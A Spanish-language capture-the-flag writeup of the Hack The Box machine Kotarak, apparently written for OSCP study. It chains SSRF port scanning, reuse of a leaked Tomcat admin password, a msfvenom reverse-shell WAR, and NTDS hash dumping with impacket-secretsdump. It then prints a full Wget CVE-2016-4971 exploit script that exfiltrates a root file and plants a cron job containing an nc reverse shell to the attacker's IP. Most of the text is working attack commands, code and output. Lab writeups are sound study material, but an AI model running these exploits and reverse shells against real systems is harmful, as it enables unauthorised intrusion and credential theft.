---
layout: post
title:  "OSCP Path ~ Kotarak de Hack The Box (Necesario VIP)"
description: Writeup de la maquina de HackTheBox llamada KOTARAK siguiendo el PATH para el OSCP
tags: HTB, OSCP Path, SSRF, Tomcat 8.6, Impackect-SecretsDump, Wget Privesc, CRON, Maquinas Retiradas, Writeup, Hacking
---

# Kotarak ~ Hack The Box to OSCP

Realizamos el Primer escaneo con Nmap
```bash
$" nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.10.55       "
``` 
Procedemos con el siguiente escaneo de Nmap
```bash
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:d7:ca:0e:b7:cb:0a:51:f7:2e:75:ea:02:24:17:74 (RSA)
|   256 e8:f1:c0:d3:7d:9b:43:73:ad:37:3b:cb:e1:64:8e:e9 (ECDSA)
|_  256 6d:e9:26:ad:86:02:2d:68:e1:eb:ad:66:a0:60:17:b8 (ED25519)
8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE OPTIONS
|   Potentially risky methods: PUT DELETE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp  open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-title: Apache Tomcat/8.5.5 - Error report
60000/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title:         Kotarak Web Hosting        
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Procedemos a hacer un reconocimiento visual de los servicios `http` en los diferentes puertos encontrados:
```bash
# 1 - http://10.10.10.55:8080/
Apache Tomcat/8.5.5

# 2 - http://10.10.10.55:60000/ 
Encontramos un buscador en el cual intentamos apuntar a la localhost de la maquin por el puerto 22 que sabiamos que estaba abierto.
Vemos que nos responde correctamente  para el puerto 22 que si estaba abierto.
``` 
Probamos a usar la herramienta Wfuzz para fuzzear por el campo que tenemos, nos creamos un diccionario `PortsDicc.txt
```bash
# wfuzz -c --hc=404 --hl=2 -t 200 -w PortsDicc.txt http://10.10.10.55:60000/url.php?path=http://127.0.0.1:FUZZ                       130 ⨯
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.55:60000/url.php?path=http://127.0.0.1:FUZZ
Total requests: 65535

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                     
=====================================================================

000000320:   200        26 L     109 W      1232 Ch     "320"                                                                       
000000200:   200        3 L      2 W        22 Ch       "200"                                                                       
000000022:   200        4 L      4 W        62 Ch       "22"                                                                        
000000888:   200        78 L     265 W      3955 Ch     "888"                                                                       
000000110:   200        17 L     24 W       187 Ch      "110"                                                                       
000000090:   200        11 L     18 W       156 Ch      "90"                                                                        
000060000:   200        78 L     130 W      1171 Ch     "60000" 
```
SSRF - Listamos puertos internos de la maquina atraves del buscador de la web apuntando al localhost : y el puerto filtrando por la longitud en la respuesta.

Investigamos los Recursos Encontrados
```bash
http://10.10.10.55:60000/url.php?path=http%3A%2F%2F127.0.0.1%3A888
```
Encontramos un directory listing con un archivo llamado `Backup`, intentamos apuntar a el.
```bash
# Apuntamos al documento añadiendo `?doc=backup`
view-source:http://10.10.10.55:60000/url.php?path=http%3A%2F%2F127.0.0.1%3A888?doc=backup 
```
No se ve nada `--- hacemos Ctrl+U ---`  Encontramos Credenciales para algun login a nivel web.
```bash
<user username="admin" password="3@g01PdhB!" roles="manager,manager-gui,admin-gui,manager-script"/>
```
Buscamos si a nivel del `Tomcat en el puerto 8080`
Buscamos con searchsploit:
```bash
# searchsploit Tomcat 8.5.5                                                                                                            1 ⚙
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path
----------------------------------------------------------------------------------------------------------- ---------------------------------
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution ( | jsp/webapps/42966.py
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution ( | windows/webapps/42953.txt
----------------------------------------------------------------------------------------------------------- ---------------------------------
```
Conseguimos entrar al panel del Admin a nivel web de Tomcat:
```bash
http://10.10.10.55:8080/manager/html
```
Introducimos las contraseñas encontradas y accedemos al panel como Administradores.
Desde Aqui seguimos los pasos para explotar el CMS Tomcat.

Con la herramienta Msfvenom vamos a crear un payload `.war` para subir al CMS de Tomcat.
```bash
 msfvenom -p java/shell_reverse_tcp lhost=10.10.14.12 lport=443 -f war -o pwn.war
```
Una vez creado lo subimos a la CMS y apuntamos a la ruta del archivo, para que se ejecute y recibamos la conexion Reversa.
```bash
http://10.10.10.55:8080/pwn/

# nc -vlnp 443                                                                                                                                                                                               1 ⚙
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.55] 44244
whoami
tomcat
```
Procedemos a hacer un tratamioento de la tty
```bash
python -c 'import pty;pty.spawn("/bin/bash")';
tomcat@kotarak-dmz:/$ ^Z
zsh: suspended  nc -vlnp 443
                                                                                                                                                                                                                   
┌──(root💀kali)-[/home/Escritorio/HTB]
└─# stty raw -echo; fg                                                                                                                                                                                   148 ⨯ 2 ⚙
[1]  - continued  nc -vlnp 443
                              reset
reset: unknown terminal type unknown
Terminal type? xterm

tomcat@kotarak-dmz:/$ export TERM=xterm
tomcat@kotarak-dmz:/$ export SHELL=bash
tomcat@kotarak-dmz:/$ stty rows 50 columns 212
```

# Escaladad de privilegios ~ Uso de Impacket-secretsdump

Nos dirigimos a la ruta `/home/tomcat`
```bash
tomcat@kotarak-dmz:/home/tomcat$ ls -lR
.:
total 4
drwxr-xr-x 3 tomcat tomcat 4096 Jul 21  2017 to_archive

./to_archive:
total 4
drwxr-xr-x 2 tomcat tomcat 4096 Jul 21  2017 pentest_data

./to_archive/pentest_data:
total 28304
-rw-r--r-- 1 tomcat tomcat 16793600 Jul 21 " 2017 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit "
-rw-r--r-- 1 tomcat tomcat 12189696 Jul 21 " 2017 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin "
```

Procedemos a pasarnos los archivos a nuestro `Kali` para analizarlos:
Estos dos archivos resultan ser del uso de la herramienta psexec para dumpear los hashes NTLM del sistema. 
Podemos usar una herramienta de `impacket` llamada `secretsdumps` para extrar los hashes de estos dos archivos.
```bash
# impacket-secretsdump -system 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin -ntds 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit LOCAL
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x14b6fb98fedc8e15107867c4722d1399
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: d77ec2af971436bccb3b6fc4a969d7ff
[*] Reading and decrypting hashes from 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit 
" Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11::: "
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WIN-3G2B0H151AC$:1000:aad3b435b51404eeaad3b435b51404ee:668d49ebfdb70aeee8bcaeac9e3e66fd:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee:::
WIN2K8$:1103:aad3b435b51404eeaad3b435b51404ee:160f6c1db2ce0994c19c46a349611487:::
WINXP1$:1104:aad3b435b51404eeaad3b435b51404ee:6f5e87fd20d1d8753896f6c9cb316279:::
WIN2K31$:1105:aad3b435b51404eeaad3b435b51404ee:cdd7a7f43d06b3a91705900a592f3772:::
WIN7$:1106:aad3b435b51404eeaad3b435b51404ee:24473180acbcc5f7d2731abe05cfa88c:::
" atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::"
```
Probamos a crackear con rainbowtables los hashes obtenidos para el usuario administrator y atanas, ya que lo hemos podido enumerar en el sistema victima.
```bash
Administrator: f16tomcat!
atanas: Password123!
```
A nivel del PC victima:
Escalamos de usuario de tomcat a atanas mediante las siguientes credenciales 
```bash
atanas: f16tomcat!
```
Procedemos con la escalada de privilegios
```bash
tomcat@kotarak-dmz:/home/tomcat$ su atanas
Password:  

atanas@kotarak-dmz:/home/tomcat$ cd ..
atanas@kotarak-dmz:/home$ cd atanas/
atanas@kotarak-dmz:~$ ls
user.txt
atanas@kotarak-dmz:~$ cat user.txt 
93f844f50491ef797c9c1xxxxxxxxxx
```
Procedemos a enumerar el sistema desde la raiz:
```bash
atanas@kotarak-dmz:/$ ls -l
total 97
drwxr-xr-x   3 root root  4096 Jul 21  2017 backups
drwxr-xr-x   2 root root  4096 Jul  9  2017 bin
drwxr-xr-x   4 root root  1024 Aug 29  2017 boot
drwxr-xr-x  20 root root  3980 Jul 20 05:56 dev
drwxr-xr-x 105 root root  4096 Jan 18  2018 etc
drwxr-xr-x   4 root root  4096 Jul 21  2017 home
drwxr-xr-x  24 root root  4096 Jul 21  2017 lib
drwxr-xr-x   2 root root  4096 Jul 21  2017 lib32
drwxr-xr-x   2 root root  4096 Jul 21  2017 lib64
drwxr-xr-x   2 root root  4096 Jul 21  2017 libx32
drwx------   2 root root 16384 Jul  9  2017 lost+found
drwxr-xr-x   4 root root  4096 Jul 21  2017 media
drwxr-xr-x   2 root root  4096 Jul 19  2016 mnt
drwxr-xr-x   4 root root  4096 Jul 21  2017 opt
dr-xr-xr-x 137 root root     0 Jul 20 05:56 proc
"drwxrwxrwx   6 root root  4096 Sep 19  2017 root "    --------- PODEMOS ACCEDER ------------ 
drwxr-xr-x  27 root root   940 Jul 20 06:25 run
drwxr-xr-x   2 root root 12288 Jul 21  2017 sbin
drwxr-xr-x   2 root root  4096 Jul 21  2017 snap
drwxr-xr-x   2 root root  4096 Jul 21  2017 srv
dr-xr-xr-x  13 root root     0 Jul 20 05:56 sys
drwxrwxrwt  10 root root  4096 Jul 20 06:56 tmp
drwxr-xr-x  13 root root  4096 Jul 21  2017 usr
drwxr-xr-x  15 root root  4096 Jul 21  2017 var
lrwxrwxrwx   1 root root    29 Aug 29  2017 vmlinuz -> boot/vmlinuz-4.4.0-87-generic
lrwxrwxrwx   1 root root    29 Jul  9  2017 vmlinuz.old -> boot/vmlinuz-4.4.0-83-generic
```

# Escada de privilegios final ~ Wget 1.16 vuln
Enumeramos el directorio `/root/`
```bash
atanas@kotarak-dmz:/root$ cat flag.txt 
Getting closer! But what you are looking for can't be found here.
atanas@kotarak-dmz:/root$ cat app.log 
10.0.3.133 - - [20/Jul/2017:22:48:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
10.0.3.133 - - [20/Jul/2017:22:50:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
10.0.3.133 - - [20/Jul/2017:22:52:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
```
Encontramos una peticion a nivel de un servicio http de la ip 10.0.3.133

Procedemos a buscar por `searchsploit wget/1.6`
```bash

# searchsploit wget 1.16    
-------------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                                         | Path
-------------------------------------------------------------------------------------------------------------------------------
GNU Wget < 1.18 - Access List Bypass / Race Condition                                                  | multiple/remote/40824.py
GNU Wget < 1.18 - Arbitrary File Upload / Remote Code Execution                                        | linux/remote/40064.txt
--------------------------------------------------------------------------------------------------------------------------------
```
Nos quedamos con el .txt y vemos que tenemos un exploit para un contexto en el que atraves de una peticion por WGET se permite redireccionar a otro archivo cualquiera.
Procedemos de la siguiente manera:
1.- nos creamos en nuestra maquina un archivo llamado `.wgetrc` en el cual le vamos a solicitar la flag de root.txt y vamos a injectar una tarea cron 
```bash
# cat .wgetrc                              
post_file = /root/root.txt
output_document = /etc/cron.d/wget-root-shell
```
Tenemos que hacer uso del siguiente exploit desde la maquina victima que viene dado en el `.txt` encontrado con searchsploit
```python
# cat exp1.py 
#!/usr/bin/env python

#
# Wget 1.18 < Arbitrary File Upload Exploit
# Dawid Golunski
# dawid( at )legalhackers.com
#
# http://legalhackers.com/advisories/Wget-Arbitrary-File-Upload-Vulnerability-Exploit.txt
#
# CVE-2016-4971 
#

import SimpleHTTPServer
import SocketServer
import socket;

class wgetExploit(SimpleHTTPServer.SimpleHTTPRequestHandler):
   def do_GET(self):
       # This takes care of sending .wgetrc

       print "We have a volunteer requesting " + self.path + " by GET :)\n"
       if "Wget" not in self.headers.getheader('User-Agent'):
          print "But it's not a Wget :( \n"
          self.send_response(200)
          self.end_headers()
          self.wfile.write("Nothing to see here...")
          return

       print "Uploading .wgetrc via ftp redirect vuln. It should land in /root \n"
       self.send_response(301)
       new_path = '%s'%('ftp://anonymous@%s:%s/.wgetrc'%(FTP_HOST, FTP_PORT) )
       print "Sending redirect to %s \n"%(new_path)
       self.send_header('Location', new_path)
       self.end_headers()

   def do_POST(self):
       # In here we will receive extracted file and install a PoC cronjob

       print "We have a volunteer requesting " + self.path + " by POST :)\n"
       if "Wget" not in self.headers.getheader('User-Agent'):
          print "But it's not a Wget :( \n"
          self.send_response(200)
          self.end_headers()
          self.wfile.write("Nothing to see here...")
          return

       content_len = int(self.headers.getheader('content-length', 0))
       post_body = self.rfile.read(content_len)
       print "Received POST from wget, this should be the extracted /etc/shadow file: \n\n---[begin]---\n %s \n---[eof]---\n\n" % (post_body)

       print "Sending back a cronjob script as a thank-you for the file..." 
       print "It should get saved in /etc/cron.d/wget-root-shell on the victim's host (because of .wgetrc we injected in the GET first response)"
       self.send_response(200)
       self.send_header('Content-type', 'text/plain')
       self.end_headers()
       self.wfile.write(ROOT_CRON)

       print "\nFile was served. Check on /root/hacked-via-wget on the victim's host in a minute! :) \n"

       return

HTTP_LISTEN_IP = '0.0.0.0'  # modificamos este valor para que este a la escucha por cualquier conexion entrante
HTTP_LISTEN_PORT = 80
FTP_HOST = '10.10.14.12'   # ponemos nuestra IP
FTP_PORT = 21

# Le metemos una Reverse_shell como tarea cron para que nos la ejecute
ROOT_CRON = "* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.12 443 >/tmp/f"

handler = SocketServer.TCPServer((HTTP_LISTEN_IP, HTTP_LISTEN_PORT), wgetExploit)

print "Ready? Is your FTP server running?"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
result = sock.connect_ex((FTP_HOST, FTP_PORT))
if result == 0:
   print "FTP found open on %s:%s. Let's go then\n" % (FTP_HOST, FTP_PORT)
else:
   print "FTP is down :( Exiting."
   exit(1)

print "Serving wget exploit on port %s...\n\n" % HTTP_LISTEN_PORT

handler.serve_forever()
```
Procedemos a ejecutar el exp1.py en la maquian victima
```bash
atanas@kotarak-dmz:/tmp$ ls
exp1.py  hsperfdata_tomcat  systemd-private-3e9e26f3a6f84a9a9b909400a5690811-systemd-timesyncd.service-AdlnuJ  vmware-root
atanas@kotarak-dmz:/tmp$ authbind python exp1.py 
Ready? Is your FTP server running?
FTP found open on 10.10.14.12:21. Let's go then

Serving wget exploit on port 80...


We have a volunteer requesting /archive.tar.gz by GET :)

Uploading .wgetrc via ftp redirect vuln. It should land in /root 

10.0.3.133 - - [20/Jul/2021 10:46:01] "GET /archive.tar.gz HTTP/1.1" 301 -
Sending redirect to ftp://anonymous@10.10.14.12:21/.wgetrc 

We have a volunteer requesting /archive.tar.gz by POST :)

Received POST from wget, this should be the extracted /etc/shadow file: 

---[begin]---
 950d1425795dfd38272c9XXXXXXXXXXXX   ------------ FLAG DE ROOT -------------
 
---[eof]---


Sending back a cronjob script as a thank-you for the file...
It should get saved in /etc/cron.d/wget-root-shell on the victim's host (because of .wgetrc we injected in the GET first response)
10.0.3.133 - - [20/Jul/2021 10:48:01] "POST /archive.tar.gz HTTP/1.1" 200 -

File was served. Check on /root/hacked-via-wget on the victim's host in a minute! :) 
```
Server FTP montado desde nuestro Kali para alojar el `.wgetrc` donde van las instrucciones maliciosas (EJECUTAR ESTO ANTES QUE EL EXPLOIT)
```
─(root💀kali)-[/home/…/HTB/OSCP/Kotarak/exploits]
└─# python3 -m pyftpdlib -p21 -w
/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
  warnings.warn("write permissions assigned to anonymous user.",
[I 2021-07-20 16:44:46] concurrency model: async
[I 2021-07-20 16:44:46] masquerade (NAT) address: None
[I 2021-07-20 16:44:46] passive ports: None
[I 2021-07-20 16:44:46] >>> starting FTP server on 0.0.0.0:21, pid=6124 <<<
[I 2021-07-20 16:45:13] 10.10.10.55:56700-[] FTP session opened (connect)
[I 2021-07-20 16:45:59] 10.10.10.55:34470-[] FTP session opened (connect)
[I 2021-07-20 16:45:59] 10.10.10.55:34470-[anonymous] USER 'anonymous' logged in.
[I 2021-07-20 16:46:00] 10.10.10.55:34470-[anonymous] RETR /home/Escritorio/HTB/OSCP/Kotarak/exploits/.wgetrc completed=1 bytes=73 seconds=0.032
[I 2021-07-20 16:46:00] 10.10.10.55:34470-[anonymous] FTP session closed (disconnect).
```

Maquina Rooteada =D 


